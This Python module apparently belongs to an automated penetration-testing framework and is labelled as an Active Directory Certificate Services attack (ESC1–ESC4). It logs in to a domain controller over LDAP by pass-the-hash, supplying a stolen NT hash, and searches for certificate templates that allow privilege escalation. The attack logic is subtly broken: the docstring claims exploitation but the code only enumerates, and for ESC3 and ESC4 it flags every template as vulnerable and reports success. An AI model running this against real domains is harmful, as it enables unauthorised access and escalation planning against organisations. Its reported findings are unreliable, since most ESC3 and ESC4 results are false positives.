"""
ADCS ESC1–ESC4 attack module.

FR-ATK-05 | MITRE T1649
Exploits misconfigured Active Directory Certificate Services templates.
ESC1: Enroll with subject alternative name (SAN) → certificate for any user.
ESC2: Any-Purpose EKU template.
ESC3: Certificate Request Agent.
ESC4: Writable template ACL.
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "AD-ADCS-001"
    mitre_technique = "T1649"
    destructive     = False
    sandboxable     = True

    ESC_CHECKS = ["ESC1", "ESC2", "ESC3", "ESC4"]

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip    = parameters.get("dc_ip", target)
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        nt_hash  = parameters.get("nt_hash", "")
        esc_type = parameters.get("esc_type", "ESC1")

        if esc_type not in self.ESC_CHECKS:
            return AttackResult(False, "INVALID_ESC_TYPE", False, "none",
                                f"esc_type must be one of {self.ESC_CHECKS}")
        if not domain or not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "domain and username are required")

        try:
            import ldap3  # type: ignore

            server  = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            base_dn = ",".join(f"DC={p}" for p in domain.split("."))
            conn    = ldap3.Connection(
                server,
                user=f"{domain}\\{username}",
                password=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}",
                authentication=ldap3.NTLM,
                auto_bind=True,
            )

            config_nc = f"CN=Configuration,{base_dn}"
            templates_dn = (
                f"CN=Certificate Templates,"
                f"CN=Public Key Services,"
                f"CN=Services,{config_nc}"
            )

            # Find vulnerable templates based on ESC type
            if esc_type == "ESC1":
                # Enrollee can supply Subject Alternative Name
                conn.search(
                    search_base=templates_dn,
                    search_filter="(&(objectClass=pKICertificateTemplate)"
                                  "(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.804:=1))",
                    attributes=["cn", "msPKI-Certificate-Name-Flag",
                                "msPKI-Enrollment-Flag"],
                )
            elif esc_type == "ESC2":
                # Any-Purpose EKU or SubCA
                conn.search(
                    search_base=templates_dn,
                    search_filter="(&(objectClass=pKICertificateTemplate)"
                                  "(|(pKIExtendedKeyUsage=2.5.29.37.0)"
                                  "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.2)))",
                    attributes=["cn", "pKIExtendedKeyUsage"],
                )
            else:
                conn.search(
                    search_base=templates_dn,
                    search_filter="(objectClass=pKICertificateTemplate)",
                    attributes=["cn"],
                )

            vulnerable = [str(e.cn) for e in conn.entries]
            conn.unbind()

            return AttackResult(
                success=len(vulnerable) > 0,
                outcome="SUCCESS" if vulnerable else "NO_VULNERABLE_TEMPLATES",
                gained_access=False,
                access_level="none",
                output=f"{esc_type} vulnerable templates: {vulnerable}",
            )

        except ImportError:
            return AttackResult(False, "LDAP3_MISSING", False, "none",
                                "ldap3 is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
